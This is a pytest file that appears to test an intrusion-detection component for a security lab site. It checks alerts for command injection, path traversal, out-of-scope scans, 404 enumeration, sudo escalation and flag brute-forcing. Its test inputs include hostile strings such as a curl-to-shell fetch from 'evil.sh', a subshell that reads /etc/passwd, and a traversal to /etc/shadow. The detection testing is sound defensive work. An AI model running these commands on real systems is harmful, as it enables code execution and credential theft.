import pytest

from app.pipeline.detection import Detector
from app.pipeline.events import LabEvent


def rules(detector: Detector, event: LabEvent) -> list[str]:
    return [a.rule for a in detector.analyze(event)]


@pytest.mark.parametrize(
    ("detail", "expected"),
    [
        ("whoami; id", "LAB-001"),
        ("cat $(echo /etc/passwd)", "LAB-001"),
        ("curl http://evil.sh | sh", "LAB-001"),
    ],
)
def test_command_injection(detail, expected):
    event = LabEvent("terminal", "cmd:unknown", "a", detail=detail)
    assert expected in rules(Detector(), event)


def test_benign_commands_do_not_alert():
    detector = Detector()
    for cmd in ["help", "whoami", "nmap lab.local", "cat the-lab-portfolio", "sudo hire carlos"]:
        kind = f"cmd:{cmd.split()[0]}"
        assert rules(detector, LabEvent("terminal", kind, "a", detail=cmd)) == []


def test_path_traversal():
    event = LabEvent("terminal", "cmd:cat", "a", detail="cat ../../etc/shadow")
    assert "LAB-002" in rules(Detector(), event)


def test_out_of_scope_scan():
    detector = Detector()
    assert rules(detector, LabEvent("terminal", "cmd:nmap", "a", detail="nmap -sV 8.8.8.8")) == [
        "LAB-003"
    ]
    assert rules(detector, LabEvent("terminal", "cmd:nmap", "b", detail="nmap lab.local")) == []


def test_enumeration_needs_a_burst_from_the_same_actor():
    detector = Detector()
    results = [rules(detector, LabEvent("http", "GET <404>", "a", status=404)) for _ in range(5)]
    assert results[:4] == [[], [], [], []]
    assert results[4] == ["LAB-005"]
    # Outro ator não herda a contagem
    assert rules(detector, LabEvent("http", "GET <404>", "b", status=404)) == []


def test_alert_cooldown_per_actor():
    detector = Detector()
    event = lambda: LabEvent("terminal", "cmd:sudo", "a", detail="sudo su")  # noqa: E731
    assert rules(detector, event()) == ["LAB-004"]
    assert rules(detector, event()) == []  # mesma regra, mesmo ator, dentro do cooldown


def test_flag_bruteforce():
    detector = Detector()
    out = [rules(detector, LabEvent("ctf", "ctf:wrong", "a")) for _ in range(5)]
    assert out[-1] == ["LAB-006"]
